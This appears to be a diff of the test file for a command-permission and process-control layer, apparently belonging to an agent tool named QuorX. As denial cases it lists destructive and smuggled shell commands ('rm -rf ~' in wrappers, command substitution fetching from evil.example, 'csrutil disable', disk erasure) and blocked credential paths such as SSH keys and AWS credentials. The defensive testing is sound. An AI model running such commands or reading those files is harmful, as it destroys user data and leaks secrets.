@@ -38,54 +38,63 @@ function fakeSystem(procs) {
 const QUORX = 100;
 const base = () => [{ pid: 1, ppid: 0, pgid: 1, comm: 'launchd' }, { pid: QUORX, ppid: 1, pgid: QUORX, comm: 'node' }, { pid: 900, ppid: 1, pgid: 900, comm: 'Safari' }];
 
-test('groups: Stop ends the whole group with SIGTERM and confirms 0 left', async () => {
-  const sys = fakeSystem([...base(), { pid: 200, ppid: QUORX, pgid: 200, comm: 'node' }, { pid: 201, ppid: 200, pgid: 200, comm: 'bash' }, { pid: 202, ppid: 201, pgid: 200, comm: 'sleep' }]);
-  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 50, pollMs: 5 });
-  G.adopt('j1', 200);
-  assert.deepEqual((await G.count('j1')).names.sort(), ['bash', 'node', 'sleep']);
-  const r = await G.kill('j1', 200);
-  assert.equal(r.left, 0);
-  assert.ok(sys.signals.some(([pid, sig]) => pid === -200 && sig === 'SIGTERM'), 'the group got SIGTERM');
-  assert.ok(!sys.signals.some(([, sig]) => sig === 'SIGKILL'), 'no SIGKILL was needed');
-  assert.ok(sys.table.has(900) && sys.table.has(QUORX), 'other programs and QuorX itself are untouched');
+test('groups: Stop sends SIGTERM to the whole group, then SIGKILL after the grace time, and confirms 0 left', async () => {
+  { // groups: Stop ends the whole group with SIGTERM and confirms 0 left
+    const sys = fakeSystem([...base(), { pid: 200, ppid: QUORX, pgid: 200, comm: 'node' }, { pid: 201, ppid: 200, pgid: 200, comm: 'bash' }, { pid: 202, ppid: 201, pgid: 200, comm: 'sleep' }]);
+    const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 50, pollMs: 5 });
+    G.adopt('j1', 200);
+    assert.deepEqual((await G.count('j1')).names.sort(), ['bash', 'node', 'sleep']);
+    const r = await G.kill('j1', 200);
+    assert.equal(r.left, 0);
+    assert.ok(sys.signals.some(([pid, sig]) => pid === -200 && sig === 'SIGTERM'), 'the group got SIGTERM');
+    assert.ok(!sys.signals.some(([, sig]) => sig === 'SIGKILL'), 'no SIGKILL was needed');
+    assert.ok(sys.table.has(900) && sys.table.has(QUORX), 'other programs and QuorX itself are untouched');
+  }
+  { // groups: what ignores SIGTERM gets SIGKILL after the grace time
+    const sys = fakeSystem([...base(), { pid: 300, ppid: QUORX, pgid: 300, comm: 'node' }, { pid: 301, ppid: 300, pgid: 300, comm: 'server', stubborn: true }]);
+    const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
+    G.adopt('j', 300);
+    const r = await G.kill('j', 200);
+    assert.equal(r.left, 0);
+    assert.ok(sys.signals.some(([pid, sig]) => pid === 301 && sig === 'SIGKILL'));
+  }
 });
 
-test('groups: what ignores SIGTERM gets SIGKILL after the grace time', async () => {
-  const sys = fakeSystem([...base(), { pid: 300, ppid: QUORX, pgid: 300, comm: 'node' }, { pid: 301, ppid: 300, pgid: 300, comm: 'server', stubborn: true }]);
-  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
-  G.adopt('j', 300);
-  const r = await G.kill('j', 200);
-  assert.equal(r.left, 0);
-  assert.ok(sys.signals.some(([pid, sig]) => pid === 301 && sig === 'SIGKILL'));
-});
-
-test('groups: a daemon that left the group is still the job’s (as a child, or seen before)', async () => {
-  const sys = fakeSystem([...base(), { pid: 400, ppid: QUORX, pgid: 400, comm: 'node' }, { pid: 401, ppid: 400, pgid: 400, comm: 'bash' }]);
-  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
-  G.adopt('j', 400);
-  // A child that calls setsid: a new group, but its parent is in the job.
-  sys.table.set(402, { pid: 402, ppid: 401, pgid: 402, comm: 'daemon' });
-  assert.ok((await G.count('j')).pids.includes(402), 'found as a child');
-  // Its parent exits and it is handed to launchd: it was seen in the job, so it still counts.
-  sys.table.delete(401); sys.table.get(402).ppid = 1;
-  assert.ok((await G.count('j')).pids.includes(402), 'remembered after it was orphaned');
-  const r = await G.kill('j', 200);
-  assert.equal(r.left, 0);
-  assert.ok(!sys.table.has(402));
-});
-
-test('groups: a reused pid with another name, zombies and QuorX itself are never counted', async () => {
-  const sys = fakeSystem([...base(), { pid: 500, ppid: QUORX, pgid: 500, comm: 'node' }, { pid: 501, ppid: 500, pgid: 500, comm: 'cc' }]);
-  const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
-  G.adopt('j', 500);
-  await G.count('j');
-  sys.table.delete(501);
-  sys.table.set(501, { pid: 501, ppid: 1, pgid: 501, comm: 'Mail' }); // the pid came back as your mail app
-  sys.table.set(503, { pid: 503, ppid: 500, pgid: 500, comm: 'ld', zombie: true });
-  const c = await G.count('j');
-  assert.deepEqual(c.names, ['node']);
-  await G.kill('j', 200);
-  assert.ok(sys.table.has(501), 'your Mail is never touched');
+test('groups: a daemon that left the group is still the job’s; reused pids, zombies and QuorX itself are never counted; /proc and ps lines are read', async () => {
+  { // groups: a daemon that left the group is still the job’s (as a child, or seen before)
+    const sys = fakeSystem([...base(), { pid: 400, ppid: QUORX, pgid: 400, comm: 'node' }, { pid: 401, ppid: 400, pgid: 400, comm: 'bash' }]);
+    const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
+    G.adopt('j', 400);
+    // A child that calls setsid: a new group, but its parent is in the job.
+    sys.table.set(402, { pid: 402, ppid: 401, pgid: 402, comm: 'daemon' });
+    assert.ok((await G.count('j')).pids.includes(402), 'found as a child');
+    // Its parent exits and it is handed to launchd: it was seen in the job, so it still counts.
+    sys.table.delete(401); sys.table.get(402).ppid = 1;
+    assert.ok((await G.count('j')).pids.includes(402), 'remembered after it was orphaned');
+    const r = await G.kill('j', 200);
+    assert.equal(r.left, 0);
+    assert.ok(!sys.table.has(402));
+  }
+  { // groups: a reused pid with another name, zombies and QuorX itself are never counted
+    const sys = fakeSystem([...base(), { pid: 500, ppid: QUORX, pgid: 500, comm: 'node' }, { pid: 501, ppid: 500, pgid: 500, comm: 'cc' }]);
+    const G = processGroups({ list: sys.list, kill: sys.kill, self: QUORX, graceMs: 30, pollMs: 5 });
+    G.adopt('j', 500);
+    await G.count('j');
+    sys.table.delete(501);
+    sys.table.set(501, { pid: 501, ppid: 1, pgid: 501, comm: 'Mail' }); // the pid came back as your mail app
+    sys.table.set(503, { pid: 503, ppid: 500, pgid: 500, comm: 'ld', zombie: true });
+    const c = await G.count('j');
+    assert.deepEqual(c.names, ['node']);
+    await G.kill('j', 200);
+    assert.ok(sys.table.has(501), 'your Mail is never touched');
+  }
+  { // groups: /proc and ps lines are read, names with spaces and brackets too
+    assert.deepEqual(parseProcStat('4242 (Web Content (x)) S 4200 4200 4200 0 -1 4194560'), { pid: 4242, ppid: 4200, pgid: 4200, comm: 'Web Content (x)', zombie: false });
+    assert.equal(parseProcStat('77 (gcc) Z 1 70 70 0').zombie, true);
+    assert.equal(parseProcStat('garbage'), null);
+    const rows = parsePs('    1     0     1 Ss   /sbin/launchd\n 4321  4300  4300 S+   /Applications/Google Chrome.app/Contents/MacOS/Google Chrome\n 99 98 98 Z <defunct>\n');
+    assert.deepEqual(rows.map((r) => [r.pid, r.pgid, r.comm, r.zombie]), [[1, 1, 'launchd', false], [4321, 4300, 'Google Chrome', false], [99, 98, '<defunct>', true]]);
+  }
 });
 
 test('groups: QuorX exiting kills every group at once', () => {
@@ -97,48 +106,40 @@ test('groups: QuorX exiting kills every group at once', () => {
   assert.equal(G.jobs.size, 0);
 });
 
-test('groups: /proc and ps lines are read, names with spaces and brackets too', () => {
-  assert.deepEqual(parseProcStat('4242 (Web Content (x)) S 4200 4200 4200 0 -1 4194560'), { pid: 4242, ppid: 4200, pgid: 4200, comm: 'Web Content (x)', zombie: false });
-  assert.equal(parseProcStat('77 (gcc) Z 1 70 70 0').zombie, true);
-  assert.equal(parseProcStat('garbage'), null);
-  const rows = parsePs('    1     0     1 Ss   /sbin/launchd\n 4321  4300  4300 S+   /Applications/Google Chrome.app/Contents/MacOS/Google Chrome\n 99 98 98 Z <defunct>\n');
-  assert.deepEqual(rows.map((r) => [r.pid, r.pgid, r.comm, r.zombie]), [[1, 1, 'launchd', false], [4321, 4300, 'Google Chrome', false], [99, 98, '<defunct>', true]]);
-});
-
 // ---------- rules: bash and zsh ----------
 const ctx = (over = {}) => ({ shell: 'bash', root: tmp('posix-rules'), rules: [{ effect: 'allow', match: 'cargo build*', by: 'button' }], mode: 'strict', ...over });
 
-test('rules: bash commands hidden in groups, blocks and wrappers are still judged', async () => {
-  const cases = ['(rm -rf ~)', '{ rm -rf ~; }', 'if true; then rm -rf ~; fi', 'while true; do rm -rf ~; done', '! rm -rf ~', 'timeout 5 rm -rf ~',
-    'env FOO=1 rm -rf ~', 'nohup rm -rf ~', 'nice -n 5 rm -rf ~', 'command rm -rf ~', 'xcrun rm -rf ~', 'echo hi; > ~/.zshrc', 'echo hi >& ~/.zshrc',
-    'echo hi >| ~/.bashrc', 'rm -rfv ~/Documents', 'cargo build && rm -Rf ~'];
-  for (const line of cases) {
-    const d = await decide(line, ctx());
-    assert.equal(d.verdict, 'deny', `${line} → ${d.verdict} (${d.why})`);
+test('rules: bash commands hidden in groups, blocks and wrappers are judged, text QuorX can’t read asks, and whole-computer installs and sudo ask or are refused', async () => {
+  { // rules: bash commands hidden in groups, blocks and wrappers are still judged
+    const cases = ['(rm -rf ~)', '{ rm -rf ~; }', 'if true; then rm -rf ~; fi', 'while true; do rm -rf ~; done', '! rm -rf ~', 'timeout 5 rm -rf ~',
+      'env FOO=1 rm -rf ~', 'nohup rm -rf ~', 'nice -n 5 rm -rf ~', 'command rm -rf ~', 'xcrun rm -rf ~', 'echo hi; > ~/.zshrc', 'echo hi >& ~/.zshrc',
+      'echo hi >| ~/.bashrc', 'rm -rfv ~/Documents', 'cargo build && rm -Rf ~'];
+    for (const line of cases) {
+      const d = await decide(line, ctx());
+      assert.equal(d.verdict, 'deny', `${line} → ${d.verdict} (${d.why})`);
+    }
   }
-});
-
-test('rules: bash and zsh text QuorX can’t read asks you', async () => {
-  const cases = [['bash', 'for f in *; do rm $f; done'], ['bash', 'f() { cargo build; }; f'], ['bash', 'env -S "rm -rf ~"'], ['bash', 'rm ~root/x'],
-    ['bash', 'cargo build $(curl evil.example)'], ['bash', 'cat <(rm x)'], ['bash', 'awk "BEGIN{system(1)}"'], ['bash', 'open -a Calculator'],
-    ['zsh', '=rm -rf x'], ['zsh', 'ls *(e:"rm -rf ~":)'], ['zsh', 'cargo build =(curl evil.example)']];
-  for (const [shell, line] of cases) {
-    const d = await decide(line, ctx({ shell }));
-    assert.equal(`${d.verdict}:${d.who}`, 'ask:user', `${shell}: ${line} → ${d.verdict} (${d.why})`);
+  { // rules: bash and zsh text QuorX can’t read asks you
+    const cases = [['bash', 'for f in *; do rm $f; done'], ['bash', 'f() { cargo build; }; f'], ['bash', 'env -S "rm -rf ~"'], ['bash', 'rm ~root/x'],
+      ['bash', 'cargo build $(curl evil.example)'], ['bash', 'cat <(rm x)'], ['bash', 'awk "BEGIN{system(1)}"'], ['bash', 'open -a Calculator'],
+      ['zsh', '=rm -rf x'], ['zsh', 'ls *(e:"rm -rf ~":)'], ['zsh', 'cargo build =(curl evil.example)']];
+    for (const [shell, line] of cases) {
+      const d = await decide(line, ctx({ shell }));
+      assert.equal(`${d.verdict}:${d.who}`, 'ask:user', `${shell}: ${line} → ${d.verdict} (${d.why})`);
+    }
   }
-});
-
-test('rules: installs for the whole computer ask you; sudo anything else is never allowed', async () => {
-  const want = async (line, v) => { const d = await decide(line, ctx()); assert.equal(d.verdict === 'ask' ? `ask:${d.who}` : d.verdict, v, `${line} (${d.why})`); return d; };
-  for (const l of ['brew install cmake', 'apt-get install -y gcc', 'dnf install gcc', 'pacman -S gcc', 'snap install code', 'port install cmake',
-    'gem install cocoapods', 'pipx install ruff', 'xcode-select --install']) await want(l, 'ask:user');
-  const d = await want('sudo apt install -y build-essential', 'ask:user');
-  assert.match(d.why, /password/);
-  await want('sudo -E apt-get install gcc', 'ask:user');
-  for (const l of ['sudo rm -rf /tmp/x', 'sudo ls', 'sudo sh -c "apt install x"', 'launchctl load x.plist', 'systemctl stop nginx', 'crontab -r',
-    'security find-generic-password -s x', 'defaults write -g AppleShowAllFiles 1', 'tccutil reset All', 'csrutil disable', 'mkfs.ext4 /dev/sdb1', 'diskutil eraseDisk x']) await want(l, 'deny');
-  for (const l of ['brew list', 'brew info cmake', 'apt list --installed', 'pacman -Qi gcc', 'dpkg -L gcc', 'xcode-select -p', 'systemctl status nginx',
-    'crontab -l', 'security find-identity -v -p codesigning', 'defaults read com.example.app', 'command -v node', 'xcrun --find clang', 'env', 'uname -a', 'sw_vers']) await want(l, 'allow');
+  { // rules: installs for the whole computer ask you; sudo anything else is never allowed
+    const want = async (line, v) => { const d = await decide(line, ctx()); assert.equal(d.verdict === 'ask' ? `ask:${d.who}` : d.verdict, v, `${line} (${d.why})`); return d; };
+    for (const l of ['brew install cmake', 'apt-get install -y gcc', 'dnf install gcc', 'pacman -S gcc', 'snap install code', 'port install cmake',
+      'gem install cocoapods', 'pipx install ruff', 'xcode-select --install']) await want(l, 'ask:user');
+    const d = await want('sudo apt install -y build-essential', 'ask:user');
+    assert.match(d.why, /password/);
+    await want('sudo -E apt-get install gcc', 'ask:user');
+    for (const l of ['sudo rm -rf /tmp/x', 'sudo ls', 'sudo sh -c "apt install x"', 'launchctl load x.plist', 'systemctl stop nginx', 'crontab -r',
+      'security find-generic-password -s x', 'defaults write -g AppleShowAllFiles 1', 'tccutil reset All', 'csrutil disable', 'mkfs.ext4 /dev/sdb1', 'diskutil eraseDisk x']) await want(l, 'deny');
+    for (const l of ['brew list', 'brew info cmake', 'apt list --installed', 'pacman -Qi gcc', 'dpkg -L gcc', 'xcode-select -p', 'systemctl status nginx',
+      'crontab -l', 'security find-identity -v -p codesigning', 'defaults read com.example.app', 'command -v node', 'xcrun --find clang', 'env', 'uname -a', 'sw_vers']) await want(l, 'allow');
+  }
 });
 
 test('rules: commands typed for Node\'s default shell are read as bash off Windows', { skip: !POSIX && 'needs macOS or Linux' }, async () => {
@@ -193,21 +194,22 @@ test('scripts: package.json scripts are read as sh off Windows', { skip: !POSIX 
 });
 
 // ---------- folders that are off limits on macOS and Linux ----------
-test('paths: macOS system folders, other profiles and your Library are blocked', () => {
-  const at = (p) => posixSystemZone(p, { platform: 'darwin', home: '/Users/me' })?.zone || 'ok';
-  for (const p of ['/System/Library/x', '/Library/LaunchDaemons/x.plist', '/Applications/Xcode.app', '/usr/bin/git', '/usr/local/bin/x', '/opt/homebrew/bin/x',
-    '/private/etc/hosts', '/etc/hosts', '/Users', '/Users/other/Documents', '/users/OTHER', '/Users/me/Library/Keychains/login.keychain-db',
-    '/Users/me/library/LaunchAgents/x.plist', '/Users/me/.ssh/id_ed25519', '/Users/me/.aws/credentials', '/Volumes/Backup']) assert.equal(at(p), 'blocked', p);
-  for (const p of ['/Users/me/code/app/x', '/Users/me/Library/Developer/Xcode/DerivedData/App-abc', '/Users/me/Library/Caches/x', '/Users/Shared/x',
-    '/private/var/folders/ab/T/x', '/private/tmp/x', '/Volumes/Backup/projects/app']) assert.equal(at(p), 'ok', p);
-});
-
-test('paths: Linux system folders, other profiles and drives are blocked', () => {
-  const at = (p) => posixSystemZone(p, { platform: 'linux', home: '/home/me' })?.zone || 'ok';
-  for (const p of ['/etc/passwd', '/usr/lib/x', '/boot/vmlinuz', '/var/lib/dpkg', '/root/.bashrc', '/home', '/home/other/x', '/proc/1/mem', '/dev/sda',
-    '/mnt/c', '/media/me/USB', '/home/me/.ssh/authorized_keys', '/home/me/.config/autostart/x.desktop', '/home/me/.local/bin/python']) assert.equal(at(p), 'blocked', p);
-  for (const p of ['/home/me/code/app', '/tmp/x', '/var/tmp/x', '/mnt/c/projects/app', '/media/me/USB/app', '/home/me/.config/Code/x', '/Home/other']) assert.equal(at(p), 'ok', p);
-  assert.equal(posixSystemZone('/home/me/x', { platform: 'linux', home: '/root' })?.zone, 'blocked', 'other profiles are blocked for root too');
+test('paths: macOS and Linux system folders, other profiles and drives are blocked', () => {
+  { // paths: macOS system folders, other profiles and your Library are blocked
+    const at = (p) => posixSystemZone(p, { platform: 'darwin', home: '/Users/me' })?.zone || 'ok';
+    for (const p of ['/System/Library/x', '/Library/LaunchDaemons/x.plist', '/Applications/Xcode.app', '/usr/bin/git', '/usr/local/bin/x', '/opt/homebrew/bin/x',
+      '/private/etc/hosts', '/etc/hosts', '/Users', '/Users/other/Documents', '/users/OTHER', '/Users/me/Library/Keychains/login.keychain-db',
+      '/Users/me/library/LaunchAgents/x.plist', '/Users/me/.ssh/id_ed25519', '/Users/me/.aws/credentials', '/Volumes/Backup']) assert.equal(at(p), 'blocked', p);
+    for (const p of ['/Users/me/code/app/x', '/Users/me/Library/Developer/Xcode/DerivedData/App-abc', '/Users/me/Library/Caches/x', '/Users/Shared/x',
+      '/private/var/folders/ab/T/x', '/private/tmp/x', '/Volumes/Backup/projects/app']) assert.equal(at(p), 'ok', p);
+  }
+  { // paths: Linux system folders, other profiles and drives are blocked
+    const at = (p) => posixSystemZone(p, { platform: 'linux', home: '/home/me' })?.zone || 'ok';
+    for (const p of ['/etc/passwd', '/usr/lib/x', '/boot/vmlinuz', '/var/lib/dpkg', '/root/.bashrc', '/home', '/home/other/x', '/proc/1/mem', '/dev/sda',
+      '/mnt/c', '/media/me/USB', '/home/me/.ssh/authorized_keys', '/home/me/.config/autostart/x.desktop', '/home/me/.local/bin/python']) assert.equal(at(p), 'blocked', p);
+    for (const p of ['/home/me/code/app', '/tmp/x', '/var/tmp/x', '/mnt/c/projects/app', '/media/me/USB/app', '/home/me/.config/Code/x', '/Home/other']) assert.equal(at(p), 'ok', p);
+    assert.equal(posixSystemZone('/home/me/x', { platform: 'linux', home: '/root' })?.zone, 'blocked', 'other profiles are blocked for root too');
+  }
 });
 
 test('paths: a real delete in a blocked macOS or Linux folder is refused', { skip: !POSIX && 'needs macOS or Linux' }, async () => {
@@ -218,34 +220,35 @@ test('paths: a real delete in a blocked macOS or Linux folder is refused', { ski
 });
 
 // ---------- the desktop tool's keys and text ----------
-test('desktop: SendKeys text becomes key presses; ^ is Command on macOS', () => {
-  assert.deepEqual(parseSendKeys('hello{ENTER}'), [{ text: 'hello' }, { key: 'return', mods: [] }]);
-  assert.deepEqual(parseSendKeys('^s'), [{ key: 's', mods: ['ctrl'] }]);
-  assert.deepEqual(parseSendKeys('%{F4}'), [{ key: 'f4', mods: ['alt'] }]);
-  assert.deepEqual(parseSendKeys('+(ab)'), [{ key: 'a', mods: ['shift'] }, { key: 'b', mods: ['shift'] }]);
-  assert.deepEqual(parseSendKeys('{TAB 3}x~'), [{ key: 'tab', mods: [] }, { key: 'tab', mods: [] }, { key: 'tab', mods: [] }, { text: 'x' }, { key: 'return', mods: [] }]);
-  assert.deepEqual(parseSendKeys('a{+}b{}}'), [{ text: 'a+b}' }]);
-  assert.deepEqual(macKeyEvents('^q'), [{ code: MAC_KEYCODES.q, mods: ['cmd'] }]);
-  assert.deepEqual(macKeyEvents('Hi{ESC}'), [{ text: 'Hi' }, { code: 53, mods: [] }]);
-  assert.throws(() => parseSendKeys('{NOPE}'), /unknown key/);
-  assert.throws(() => macKeyEvents('^é'), /can't be pressed/);
-});
-
-test('desktop: macOS and Linux controls read as the same numbered text as Windows', () => {
-  const nodes = [
-    { indent: 0, role: 'AXWindow', name: 'Counter', enabled: true },
-    { indent: 1, role: 'AXStaticText', name: 'Count: 3', enabled: true },
-    { indent: 1, role: 'AXButton', name: 'Add', enabled: true, ref: 1, x: 40.4, y: 80 },
-    { indent: 1, role: 'AXTextField', name: 'Name', value: 'Ada', enabled: true, ref: 2, x: 120, y: 30 },
-    { indent: 1, role: 'AXCheckBox', name: 'Dark mode', checked: true, enabled: true, ref: 3, x: 10, y: 10 },
-    { indent: 1, role: 'push button', name: 'Reset', enabled: false },
-    { indent: 1, role: 'check box', name: 'Hidden', checked: false, offscreen: true, ref: 4 },
-  ];
-  assert.equal(treeText(nodes, { more: true }), [
-    'Window "Counter"', '  Text "Count: 3"', '  [1] Button "Add" @40,80', '  [2] Edit "Name" value="Ada" @120,30', '  [3] CheckBox "Dark mode" checked @10,10',
-    '  Button "Reset" (disabled)', '  [4] CheckBox "Hidden" unchecked (off screen)', '… (more controls not shown)', ''].join('\n'));
-  assert.equal(roleName('AXPopUpButton'), 'ComboBox');
-  assert.equal(roleName('AXSplitGroup'), 'SplitGroup');
+test('desktop: SendKeys text becomes key presses (^ is Command on macOS), and macOS and Linux controls read as the same numbered text', () => {
+  { // desktop: SendKeys text becomes key presses; ^ is Command on macOS
+    assert.deepEqual(parseSendKeys('hello{ENTER}'), [{ text: 'hello' }, { key: 'return', mods: [] }]);
+    assert.deepEqual(parseSendKeys('^s'), [{ key: 's', mods: ['ctrl'] }]);
+    assert.deepEqual(parseSendKeys('%{F4}'), [{ key: 'f4', mods: ['alt'] }]);
+    assert.deepEqual(parseSendKeys('+(ab)'), [{ key: 'a', mods: ['shift'] }, { key: 'b', mods: ['shift'] }]);
+    assert.deepEqual(parseSendKeys('{TAB 3}x~'), [{ key: 'tab', mods: [] }, { key: 'tab', mods: [] }, { key: 'tab', mods: [] }, { text: 'x' }, { key: 'return', mods: [] }]);
+    assert.deepEqual(parseSendKeys('a{+}b{}}'), [{ text: 'a+b}' }]);
+    assert.deepEqual(macKeyEvents('^q'), [{ code: MAC_KEYCODES.q, mods: ['cmd'] }]);
+    assert.deepEqual(macKeyEvents('Hi{ESC}'), [{ text: 'Hi' }, { code: 53, mods: [] }]);
+    assert.throws(() => parseSendKeys('{NOPE}'), /unknown key/);
+    assert.throws(() => macKeyEvents('^é'), /can't be pressed/);
+  }
+  { // desktop: macOS and Linux controls read as the same numbered text as Windows
+    const nodes = [
+      { indent: 0, role: 'AXWindow', name: 'Counter', enabled: true },
+      { indent: 1, role: 'AXStaticText', name: 'Count: 3', enabled: true },
+      { indent: 1, role: 'AXButton', name: 'Add', enabled: true, ref: 1, x: 40.4, y: 80 },
+      { indent: 1, role: 'AXTextField', name: 'Name', value: 'Ada', enabled: true, ref: 2, x: 120, y: 30 },
+      { indent: 1, role: 'AXCheckBox', name: 'Dark mode', checked: true, enabled: true, ref: 3, x: 10, y: 10 },
+      { indent: 1, role: 'push button', name: 'Reset', enabled: false },
+      { indent: 1, role: 'check box', name: 'Hidden', checked: false, offscreen: true, ref: 4 },
+    ];
+    assert.equal(treeText(nodes, { more: true }), [
+      'Window "Counter"', '  Text "Count: 3"', '  [1] Button "Add" @40,80', '  [2] Edit "Name" value="Ada" @120,30', '  [3] CheckBox "Dark mode" checked @10,10',
+      '  Button "Reset" (disabled)', '  [4] CheckBox "Hidden" unchecked (off screen)', '… (more controls not shown)', ''].join('\n'));
+    assert.equal(roleName('AXPopUpButton'), 'ComboBox');
+    assert.equal(roleName('AXSplitGroup'), 'SplitGroup');
+  }
 });
 
 // ---------- real processes (macOS and Linux) ----------
